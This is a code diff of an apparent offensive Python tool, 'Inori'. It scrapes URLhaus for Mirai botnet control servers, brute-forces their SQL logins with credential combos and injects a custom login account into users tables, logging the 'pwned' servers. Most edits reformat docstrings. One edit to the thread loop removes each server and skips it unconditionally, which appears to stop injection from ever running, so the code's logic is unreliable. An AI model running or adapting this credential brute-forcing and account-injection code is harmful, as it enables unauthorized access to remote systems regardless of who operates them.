@@ -49,11 +49,13 @@ class Inori:
 
     @staticmethod    
     def update_db(entry: dict) -> bool | None: 
-        """
-        Update database with our new entry
-         - Puts entry in database.json
+        """Update database with our new entry
+            Args:
+                Entry(dict): Entry(pwned cnc server with extra info) 
+                             that is gonna put in database.json
 
-            Return: bool
+            Returns: 
+                bool
         """
         with open('database.json','r+') as database_file:
             file_data: dict = load(database_file)
@@ -71,11 +73,11 @@ class Inori:
 
 
     @staticmethod
-    def urlhaus() -> list:
-        """
-        Scrape URLHAUS for Mirai CNC's.
+    def urlhaus() -> list[str, ...]: # type: ignore
+        """Scrape URLHAUS for Mirai CNC's.
 
-            Return: list
+            Return: 
+                list(str, ...): List containing all server IP's from database.
         """
         all_servers: list = []
         cache:       list = [] # Store IP addresses here (to not get doubles)
@@ -123,21 +125,27 @@ class Inori:
     '''INORI METHODS.'''
 
     def fire(self: Inori) -> None:
-        """
-        Main function that starts each thread.
+        """Main function that starts each thread.
 
-            Return: None
+            Args:
+                None
+
+            Return: 
+                None
         """
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             [executor.submit(self.execution) for _ in range(self.threads)]
 
 
     def execution(self: Inori) -> None:
-        """
-        Thread that cycles through the list
-        and selects one entry at a time (each thread).
+        """Thread that cycles through the list
+           and selects one entry at a time (each thread).
 
-            Return: None
+            Args:
+                None
+
+            Returns: 
+                None
         """
 
         '''Proper cycle system.'''
@@ -147,23 +155,23 @@ class Inori:
             # NOTE: cycle through entire list.
             for cnc_server in self.ip_list:
                 if cnc_server in self.ip_list:
-                    try:
-                        # NOTE: Entry gets deleted (prevents repetition)
-                        self.ip_list.remove(cnc_server)
-                    except:
-                        continue
+                    # NOTE: Entry gets deleted (prevents repetition)
+                    self.ip_list.remove(cnc_server)
+                    continue
+
                 self.injection(cnc_server)
 
 
 
-    def injection(self: Inori, cnc_server) -> None:
-        """ 
-        Inject our custom login into the SQL Server
-        if login was a success.
+    def injection(self: Inori, cnc_server: dict) -> None:
+        """Inject our custom login into the SQL Server
+           if login was a success.
+
+            Args:
+                cnc_server(dict): The entry being updated (Contains: ip, arch, etc...).
             
-             - cnc_server is the entry being updated.
-            
-             Return: Dictionary containing results
+            Returns: 
+                Dictionary update results.
         """
 
         for cred in self.combos:
@@ -182,7 +190,7 @@ class Inori:
                                 
                                 
                     # NOTE: Check each database for the users table.
-                    for db in [db[0] for db in cursor.fetchall() if not db[0] in SQL_FILTER]:
+                    for db in [db[0] for db in cursor.fetchall() if not [filt for filt in SQL_FILTER if filt in db[0]]]:
                         cursor.execute(f'use {db};')
                                     
                         try:
